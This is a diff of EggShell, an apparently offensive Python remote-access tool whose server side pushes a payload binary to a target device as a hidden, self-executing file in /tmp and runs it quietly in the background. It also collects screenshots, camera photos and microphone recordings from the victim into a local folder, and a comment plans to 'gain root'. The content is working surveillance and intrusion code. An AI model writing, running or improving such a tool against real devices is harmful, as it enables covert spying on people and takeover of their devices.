@@ -1,6 +1,8 @@
+#!/usr/bin/python
 #EggShell
 #Created By lucas.py 8-18-16
-debug = 1
+#TODO: Gain root, and fix for any system() call locally
+debug = 0
 
 import base64
 import binascii
@@ -103,7 +105,7 @@ def bbde(data):
     return base64.b64decode(data)
 
 def showLocalHelp():
-    print WHITEBU+"Local Commands:"+"\n"+ENDC
+    print WHITEBU+"Local Commands (Do not work on windows):"+"\n"+ENDC
     showCommand("lls","list contents of local directory")
     showCommand("lcd","change local directories")
     showCommand("lpwd","get current local directory")
@@ -350,17 +352,17 @@ def downloadFile(command,conn):
     filename = ""
     dateFormat = "%Y%m%d%H%M%S"
     if args[0] == "screenshot":
-        filename = "screenshot"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/screenshot"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "picture":
-        filename = "isight"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/isight"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "frontcam":
-        filename = "frontcamera"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/frontcamera"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "backcam":
-        filename = "backcamera"+time.strftime(dateFormat)+".jpeg"
+        filename = "data/backcamera"+time.strftime(dateFormat)+".jpeg"
     elif args[0] == "mic":
-        filename = "mic"+time.strftime(dateFormat)+".aac"
+        filename = "data/mic"+time.strftime(dateFormat)+".aac"
     else:
-        filename = command[9:]
+        filename = "data/"+command[9:]
 
     progress = 0
     file = open(os.getcwd()+"/.tmpfile", "a+b")
@@ -516,7 +518,8 @@ class SessionHandler:
             binaryFile = open("src/binaries/esplios", "rb")
             payload = binaryFile.read()
             binaryFile.close()
-            preload = "rm /usr/bin/.espl 2> /dev/null; cat >/usr/bin/.espl; chmod +x /usr/bin/.espl; exit & /usr/bin/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
+			#fixed problem where user couldn't write to mobile, but now we need root for somethings?
+            preload = "rm /tmp/.espl 2> /dev/null; cat >/tmp/.espl; chmod +x /tmp/.espl; /tmp/.espl "+INSTRUCT_BINARY_ARGUMENT+" 2> /dev/null &\n"
         elif "Linux" in CDA:
             if verbose:
                 print strinfo("Detected Linux, this isn't supported yet")
@@ -544,7 +547,9 @@ class SessionHandler:
             print strinfo("Waiting For Connection...")
         conn, hostAddress = s.accept()
         data = receiveString(conn)
-
+        lafix = Thread(target = delayfive, args=(s,))
+        lafix.daemon=True
+        lafix.start()
         if data: #payload should return the name of the device and we will use that as our prompt
             self.uid = data.split(" ")[0]
             data = data.replace(self.uid+" ","")
@@ -556,6 +561,11 @@ class SessionHandler:
             s.close()
             return [name,conn,host,port,CDA]
 
+def delayfive(s):
+    time.sleep(5)
+    s.close()
+    s.close()
+			
 #MARK: MultiServer
 
 def multiServer(host,port):
@@ -568,8 +578,8 @@ def multiServer(host,port):
         skip = 0
         for sx in sessions:
             if newsession.uid == sessions[sx].uid:
-                #newsession.conn.close()
-                #skip = 1
+                newsession.conn.close()
+                skip = 1
                 continue
         if skip:
             continue
